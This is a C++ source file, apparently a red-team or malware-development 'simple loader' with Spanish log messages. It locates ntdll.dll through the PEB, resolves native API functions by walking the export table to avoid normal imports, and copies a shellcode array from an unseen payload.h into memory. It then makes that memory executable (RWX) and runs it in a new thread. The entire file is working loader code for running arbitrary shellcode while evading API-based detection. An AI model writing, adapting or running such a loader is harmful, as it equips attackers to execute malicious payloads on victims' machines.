// Loader.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>

#include "Loader.h"

#include "payload.h"

// =========================================

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NtCurrentProcess() ((HANDLE)-1)

// =========================================

#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)


#define LOG_OK(fmt, ...)\
    print("[+] " fmt, ##__VA_ARGS__)

#define LOG_ERROR(fmt, ...)\
    print("[-] " fmt, ##__VA_ARGS__)

#define LOG_WARNING(fmt, ...)\
    print("[!] " fmt, ##__VA_ARGS__)

#define LOG_INFO(fmt, ...)\
    print("[.] " fmt, ##__VA_ARGS__)

// ==========================================

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList);


PVOID GetNtdllBase() {
    // En x64, el PEB está en gs:[0x60]
    PPEB peb = (PPEB)__readgsqword(0x60);

    if (!peb || !peb->Ldr) return NULL;

    PMY_PEB_LDR_DATA ldr = (PMY_PEB_LDR_DATA)peb->Ldr;

    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head) {

        PMY_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (entry->BaseDllName.Buffer && wcsstr(entry->BaseDllName.Buffer, L"ntdll.dll")) {
            return entry->DllBase;
        }
        current = current->Flink;
    }
    return NULL;
}


PVOID GetFunctionAddress(PVOID moduleBase, const char* funcName) {

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY exportDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (exportDirEntry.VirtualAddress == 0) return NULL; 

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)moduleBase + exportDirEntry.VirtualAddress);

    PDWORD addressOfFunctions = (PDWORD)((BYTE*)moduleBase + exportDir->AddressOfFunctions);
    PDWORD addressOfNames = (PDWORD)((BYTE*)moduleBase + exportDir->AddressOfNames);
    PWORD addressOfOrdinals = (PWORD)((BYTE*)moduleBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* currentName = (char*)((BYTE*)moduleBase + addressOfNames[i]);
        if (strcmp(currentName, funcName) == 0) {
            WORD ordinal = addressOfOrdinals[i];
            DWORD functionRVA = addressOfFunctions[ordinal];
            return (PVOID)((BYTE*)moduleBase + functionRVA);
        }
    }
    return NULL;
}


int main()
{
    
    print("WELCOME TO SIMPLE LOADER...\n");

    LOG_INFO("Getting ntdll base... \n");

    PVOID ntdllBase = GetNtdllBase();

    if (ntdllBase) {
        LOG_OK("\tntdll.dll Base Address: %p\n", ntdllBase);
    }
    else {
        LOG_ERROR("\tNo se pudo encontrar ntdll.dll\n");
        return 1;
    }

    LOG_INFO("Resolviendo direccion de funcion de NtVirtualAlloc");

    pNtAllocateVirtualMemory pAlloc = (pNtAllocateVirtualMemory) GetFunctionAddress(ntdllBase, "NtAllocateVirtualMemory");

    if (!pAlloc) {
        LOG_ERROR("\tNo se pudo resolver NtAllocateVirtualMemory\n");
        return 1;
    }

    LOG_INFO("Resolviendo direccion de funcion de NtProtectVirtualMemory");

    pNtProtectVirtualMemory pProt = (pNtProtectVirtualMemory) GetFunctionAddress(ntdllBase, "NtProtectVirtualMemory");

    if (!pProt) {
        LOG_ERROR("\tNo se pudo resolver NtProtectVirtualMemory\n");
        return 1;
    }

    LOG_INFO("Resolviendo direccion de funcion de NtCreateThreadEx");

    pNtCreateThreadEx pThr = (pNtCreateThreadEx) GetFunctionAddress(ntdllBase, "NtCreateThreadEx");

    if (!pThr) {
        LOG_ERROR("\tNo se pudo resolver NtProtectVirtualMemory\n");
        return 1;
    }

    LOG_OK("NtAllocateVirtualMemory: %p\n", pAlloc);
    LOG_OK("NtProtectVirtualMemory:  %p\n", pProt);
    LOG_OK("NtCreateThreadEx:        %p\n", pThr);

    PVOID mem = NULL;
    SIZE_T size = sizeof(shellcode);
    NTSTATUS st = pAlloc(NtCurrentProcess(), &mem, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(st)) {
        LOG_ERROR("[-] NtAllocateVirtualMemory fallo: 0x%lX", (unsigned long)st);
        return 1;
    }

    LOG_OK("Memoria RW en : % p (size : % zu)", mem, size);

    memcpy(mem, shellcode, sizeof(shellcode));

    
    PVOID protAddr = mem;
    SIZE_T protSize = sizeof(shellcode);
    ULONG oldProt = 0;
    
    st = pProt(NtCurrentProcess(), &protAddr, &protSize, PAGE_EXECUTE_READWRITE, &oldProt);

    if (!NT_SUCCESS(st)) {
        LOG_ERROR("NtProtectVirtualMemory fallo: 0x%lX", (unsigned long)st);
        return 1;
    }
    LOG_OK("Proteccion cambiada a RX(antes: 0x % lX)", oldProt);


    HANDLE hThread = NULL;

    st = pThr(&hThread, GENERIC_ALL, NULL, NtCurrentProcess(), mem, NULL, 0, 0, 0, 0, NULL);

    if (!NT_SUCCESS(st)) {
        printf("[-] NtCreateThreadEx fallo: 0x%lX\n", (unsigned long)st);
        return 1;
    }
    printf("[+] Hilo creado: %p\n", hThread);

    WaitForSingleObject(hThread, 10000);

    printf("[+] Ejecucion completada\n");

    return 0;
}